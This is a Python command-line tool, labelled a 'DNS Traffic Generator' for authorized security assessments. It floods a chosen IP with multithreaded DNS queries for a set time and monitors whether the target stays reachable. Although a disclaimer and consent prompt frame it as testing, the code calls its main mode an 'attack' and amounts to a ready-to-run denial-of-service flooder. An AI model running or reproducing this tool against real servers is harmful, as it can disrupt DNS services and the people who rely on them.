#!/usr/bin/env python3
"""
DNS Traffic Generator Tool - 
A comprehensive network testing tool for authorized security assessments.
"""

import os
import sys
import time
import socket
import threading
import random
import json
import subprocess
import platform
from datetime import datetime
import requests
import dns.message
import dns.query
import dns.flags
from colorama import init, Fore, Back, Style

# Initialize colorama
init()

# Purple theme configuration
THEME = {
    'primary': Fore.MAGENTA,
    'secondary': Fore.LIGHTMAGENTA_EX,
    'accent': Fore.LIGHTBLUE_EX,
    'warning': Fore.YELLOW,
    'error': Fore.RED,
    'success': Fore.GREEN,
    'info': Fore.CYAN,
    'background': Back.MAGENTA,
    'reset': Style.RESET_ALL,
    'bright': Style.BRIGHT,
    'dim': Style.DIM
}

# Global variables
CONFIG_FILE = 'dns_traffic_tool_config.json'
config = {
    'telegram_token': '',
    'telegram_chat_id': '',
    'monitoring_interval': 5,
    'max_threads': 100,
    'default_duration': 60,
    'dns_query_types': ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME'],
    'last_target': None
}
active_threads = []
monitoring_active = False
attack_active = False
status_messages = []

# DNS query templates
DNS_QUERIES = [
    "example.com",
    "google.com",
    "yahoo.com",
    "microsoft.com",
    "amazon.com",
    "facebook.com",
    "twitter.com",
    "instagram.com",
    "linkedin.com",
    "reddit.com",
    # Add more domains as needed
]

class DNSTrafficGenerator:
    def __init__(self):
        self.load_config()
        self.setup_console()
        
    def setup_console(self):
        """Setup console title and clear screen"""
        if platform.system() == 'Windows':
            os.system('titleAccurate Cyber Defense DNS Traffic Generator - Ian Carter Kulani')
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        """Display the tool banner"""
        banner = f"""
{THEME['primary']}{THEME['bright']}
  ____  _   _ ____    _____                           _____                _             
 |  _ \| \ | / ___|  |_   _| __ __ _ _ __  ___ _ __ |_   _| __ __ _  __ _| | _____ _ __ 
 | | | |  \| \___ \    | || '__/ _` | '_ \/ __| '_ \  | || '__/ _` |/ _` | |/ / _ \ '__|
 | |_| | |\  |___) |   | || | | (_| | | | \__ \ |_) | | || | | (_| | (_| |   <  __/ |   
 |____/|_| \_|____/    |_||_|  \__,_|_| |_|___/ .__/  |_||_|  \__,_|\__,_|_|\_\___|_|   
                                              |_|                                        
{THEME['reset']}
{THEME['secondary']}Accurate Cyber Defnse DNS Traffic Generator Tool - Ian Carter Kulani{THEME['reset']}
{THEME['dim']}Version 3.7.1 | Authorized Use Only{THEME['reset']}
"""
        print(banner)
        
    def load_config(self):
        """Load configuration from file"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    loaded_config = json.load(f)
                    config.update(loaded_config)
        except Exception as e:
            self.print_error(f"Error loading config: {str(e)}")
            
    def save_config(self):
        """Save configuration to file"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            self.print_error(f"Error saving config: {str(e)}")
            
    def print_error(self, message):
        """Print error message"""
        print(f"{THEME['error']}[!] ERROR: {message}{THEME['reset']}")
        
    def print_success(self, message):
        """Print success message"""
        print(f"{THEME['success']}[+] {message}{THEME['reset']}")
        
    def print_warning(self, message):
        """Print warning message"""
        print(f"{THEME['warning']}[!] WARNING: {message}{THEME['reset']}")
        
    def print_info(self, message):
        """Print info message"""
        print(f"{THEME['info']}[*] {message}{THEME['reset']}")
        
    def print_status(self, message):
        """Print status message"""
        print(f"{THEME['secondary']}[~] {message}{THEME['reset']}")
        status_messages.append(message)
        
    def clear_screen(self):
        """Clear the console screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
    def send_telegram_message(self, message):
        """Send message via Telegram"""
        if not config['telegram_token'] or not config['telegram_chat_id']:
            self.print_warning("Telegram not configured. Use 'config telegram_token' and 'config telegram_chat' first.")
            return False
            
        try:
            url = f"https://api.telegram.org/bot{config['telegram_token']}/sendMessage"
            payload = {
                'chat_id': config['telegram_chat_id'],
                'text': message,
                'parse_mode': 'Markdown'
            }
            response = requests.post(url, data=payload)
            return response.status_code == 200
        except Exception as e:
            self.print_error(f"Failed to send Telegram message: {str(e)}")
            return False
            
    def ping_target(self, target_ip):
        """Ping a target IP address"""
        try:
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            command = ['ping', param, '4', target_ip]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            if result.returncode == 0:
                self.print_success(f"Ping to {target_ip} successful")
                print(result.stdout)
            else:
                self.print_error(f"Ping to {target_ip} failed")
                print(result.stderr)
        except Exception as e:
            self.print_error(f"Ping error: {str(e)}")
            
    def generate_dns_query(self, target_ip, port=53):
        """Generate a DNS query to the target server"""
        try:
            query_type = random.choice(config['dns_query_types'])
            query_name = random.choice(DNS_QUERIES)
            
            query = dns.message.make_query(query_name, query_type)
            query.flags |= dns.flags.RD
            
            response = dns.query.udp(query, target_ip, port=port, timeout=2)
            
            return True
        except dns.exception.Timeout:
            return False
        except Exception as e:
            self.print_error(f"DNS query error: {str(e)}")
            return False
            
    def dns_traffic_worker(self, target_ip, port, duration):
        """Worker thread for generating DNS traffic"""
        end_time = time.time() + duration
        query_count = 0
        success_count = 0
        
        while time.time() < end_time and attack_active:
            try:
                if self.generate_dns_query(target_ip, port):
                    success_count += 1
                query_count += 1
                
                # Random delay between queries (0.01 - 0.1 seconds)
                time.sleep(random.uniform(0.01, 0.1))
            except Exception as e:
                self.print_error(f"Worker error: {str(e)}")
                break
                
        return query_count, success_count
        
    def generate_dns_traffic(self, target_ip, port=53, duration=60, threads=50):
        """Generate high volume of DNS traffic to target"""
        global attack_active
        
        if not target_ip:
            self.print_error("No target IP specified")
            return
            
        self.print_status(f"Starting DNS traffic generation to {target_ip}:{port} for {duration} seconds with {threads} threads...")
        attack_active = True
        config['last_target'] = target_ip
        
        thread_pool = []
        total_queries = 0
        total_success = 0
        
        # Create worker threads
        for _ in range(threads):
            t = threading.Thread(target=self.dns_traffic_worker, args=(target_ip, port, duration))
            thread_pool.append(t)
            t.start()
            
        # Monitor progress
        start_time = time.time()
        while time.time() < start_time + duration and attack_active:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            self.print_status(f"Attack in progress: {elapsed}s elapsed, {remaining}s remaining")
            time.sleep(1)
            
        # Wait for threads to complete
        for t in thread_pool:
            t.join()
            
        attack_active = False
        self.print_success(f"DNS traffic generation completed")
        self.print_info(f"Target: {target_ip}:{port}")
        self.print_info(f"Duration: {duration} seconds")
        self.print_info(f"Threads: {threads}")
        
    def monitor_target(self, target_ip, interval=5):
        """Monitor target availability"""
        global monitoring_active
        
        self.print_status(f"Starting monitoring for {target_ip} (interval: {interval}s)")
        monitoring_active = True
        
        try:
            while monitoring_active:
                # Check ping
                param = '-n' if platform.system().lower() == 'windows' else '-c'
                command = ['ping', param, '1', target_ip]
                ping_result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                ping_ok = ping_result.returncode == 0
                
                # Check DNS
                dns_ok = False
                try:
                    query = dns.message.make_query('example.com', 'A')
                    response = dns.query.udp(query, target_ip, timeout=2)
                    dns_ok = True
                except:
                    pass
                    
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                status_msg = f"[{timestamp}] {target_ip} - Ping: {'OK' if ping_ok else 'FAIL'}, DNS: {'OK' if dns_ok else 'FAIL'}"
                
                print(status_msg)
                status_messages.append(status_msg)
                
                if not monitoring_active:
                    break
                    
                time.sleep(interval)
                
        except KeyboardInterrupt:
            monitoring_active = False
            self.print_status("Monitoring stopped by user")
        except Exception as e:
            self.print_error(f"Monitoring error: {str(e)}")
            monitoring_active = False
            
        self.print_status("Monitoring stopped")
        
    def show_help(self):
        """Display help information"""
        help_text = f"""
{THEME['primary']}{THEME['bright']}Available Commands:{THEME['reset']}

{THEME['secondary']}General Commands:{THEME['reset']}
  help                - Show this help message
  clear               - Clear the console screen
  exit                - Exit the program
  status              - Show current tool status
  view                - View status messages history

{THEME['secondary']}Network Commands:{THEME['reset']}
  ping <ip>           - Ping a target IP address
  generate dns traffic <ip> [port] [duration] [threads] - Generate DNS traffic to target
  start monitoring <ip> [interval] - Start monitoring target availability
  stop                - Stop current operation (attack/monitoring)

{THEME['secondary']}Configuration Commands:{THEME['reset']}
  config telegram_token <token> - Set Telegram bot token
  config telegram_chat <chat_id> - Set Telegram chat ID
  config threads <number> - Set default number of threads
  config duration <seconds> - Set default attack duration
  config view         - View current configuration
"""
        print(help_text)
        
    def show_status(self):
        """Show current tool status"""
        status_text = f"""
{THEME['primary']}{THEME['bright']}Current Status:{THEME['reset']}

{THEME['secondary']}Operations:{THEME['reset']}
  Monitoring Active: {'Yes' if monitoring_active else 'No'}
  Attack Active: {'Yes' if attack_active else 'No'}
  Active Threads: {threading.active_count() - 1}  # Subtract main thread

{THEME['secondary']}Configuration:{THEME['reset']}
  Telegram Token: {'Configured' if config['telegram_token'] else 'Not configured'}
  Telegram Chat ID: {'Configured' if config['telegram_chat_id'] else 'Not configured'}
  Default Threads: {config['max_threads']}
  Default Duration: {config['default_duration']} seconds
  Last Target: {config['last_target'] or 'None'}
"""
        print(status_text)
        
    def show_config(self):
        """Show current configuration"""
        config_text = f"""
{THEME['primary']}{THEME['bright']}Current Configuration:{THEME['reset']}

{THEME['secondary']}Telegram:{THEME['reset']}
  Token: {config['telegram_token'] or 'Not set'}
  Chat ID: {config['telegram_chat_id'] or 'Not set'}

{THEME['secondary']}Attack Settings:{THEME['reset']}
  Max Threads: {config['max_threads']}
  Default Duration: {config['default_duration']} seconds
  DNS Query Types: {', '.join(config['dns_query_types'])}

{THEME['secondary']}Last Target:{THEME['reset']}
  IP: {config['last_target'] or 'None'}
"""
        print(config_text)
        
    def view_messages(self):
        """View status messages history"""
        self.print_info("Status Messages History:")
        for idx, msg in enumerate(status_messages[-20:], 1):  # Show last 20 messages
            print(f"{idx}. {msg}")
            
    def stop_operations(self):
        """Stop all active operations"""
        global monitoring_active, attack_active
        
        if monitoring_active or attack_active:
            monitoring_active = False
            attack_active = False
            self.print_success("All operations stopped")
        else:
            self.print_warning("No active operations to stop")
            
    def process_command(self, command):
        """Process user command"""
        parts = command.strip().split()
        if not parts:
            return
            
        cmd = parts[0].lower()
        
        try:
            if cmd == 'help':
                self.show_help()
                
            elif cmd == 'ping' and len(parts) > 1:
                self.ping_target(parts[1])
                
            elif cmd == 'generate' and len(parts) > 3 and parts[1] == 'dns' and parts[2] == 'traffic':
                target_ip = parts[3]
                port = int(parts[4]) if len(parts) > 4 else 53
                duration = int(parts[5]) if len(parts) > 5 else config['default_duration']
                threads = int(parts[6]) if len(parts) > 6 else config['max_threads']
                
                self.generate_dns_traffic(target_ip, port, duration, threads)
                
            elif cmd == 'start' and len(parts) > 2 and parts[1] == 'monitoring':
                target_ip = parts[2]
                interval = int(parts[3]) if len(parts) > 3 else config['monitoring_interval']
                
                monitor_thread = threading.Thread(target=self.monitor_target, args=(target_ip, interval))
                monitor_thread.daemon = True
                monitor_thread.start()
                
            elif cmd == 'stop':
                self.stop_operations()
                
            elif cmd == 'config':
                if len(parts) > 1:
                    subcmd = parts[1].lower()
                    
                    if subcmd == 'telegram_token' and len(parts) > 2:
                        config['telegram_token'] = parts[2]
                        self.save_config()
                        self.print_success("Telegram token updated")
                        
                    elif subcmd == 'telegram_chat' and len(parts) > 2:
                        config['telegram_chat_id'] = parts[2]
                        self.save_config()
                        self.print_success("Telegram chat ID updated")
                        
                    elif subcmd == 'threads' and len(parts) > 2:
                        config['max_threads'] = int(parts[2])
                        self.save_config()
                        self.print_success(f"Default threads set to {parts[2]}")
                        
                    elif subcmd == 'duration' and len(parts) > 2:
                        config['default_duration'] = int(parts[2])
                        self.save_config()
                        self.print_success(f"Default duration set to {parts[2]} seconds")
                        
                    elif subcmd == 'view':
                        self.show_config()
                        
                    else:
                        self.print_error("Invalid config command")
                else:
                    self.show_config()
                    
            elif cmd == 'view':
                self.view_messages()
                
            elif cmd == 'status':
                self.show_status()
                
            elif cmd == 'clear':
                self.clear_screen()
                
            elif cmd == 'exit':
                self.stop_operations()
                self.print_info("Exiting DNS Traffic Generator Tool...")
                sys.exit(0)
                
            else:
                self.print_error("Unknown command. Type 'help' for available commands.")
                
        except Exception as e:
            self.print_error(f"Command processing error: {str(e)}")
            
    def run(self):
        """Main tool loop"""
        self.clear_screen()
        self.print_banner()
        self.print_info("Type 'help' for available commands")
        
        while True:
            try:
                prompt = f"{THEME['primary']}DNS-Traffic{THEME['reset']} > "
                command = input(prompt)
                self.process_command(command)
            except KeyboardInterrupt:
                self.print_info("\nUse 'exit' to quit the program")
            except Exception as e:
                self.print_error(f"Unexpected error: {str(e)}")

# Main entry point
if __name__ == '__main__':
    # Disclaimer - this must be shown to users
    disclaimer = f"""
{THEME['warning']}{THEME['bright']}
DISCLAIMER: This tool is for authorized security testing and educational purposes only.
Unauthorized use against any systems without explicit permission is illegal and prohibited.
The developers assume no liability and are not responsible for any misuse or damage caused.
{THEME['reset']}
"""
    print(disclaimer)
    
    # Confirm user understands the legal implications
    response = input(f"{THEME['warning']}Do you understand and accept these terms? (yes/no): {THEME['reset']}")
    if response.lower() != 'yes':
        print(f"{THEME['error']}Access denied. You must accept the terms to use this tool.{THEME['reset']}")
        sys.exit(1)
        
    # Run the tool
    tool = DNSTrafficGenerator()
    tool.run()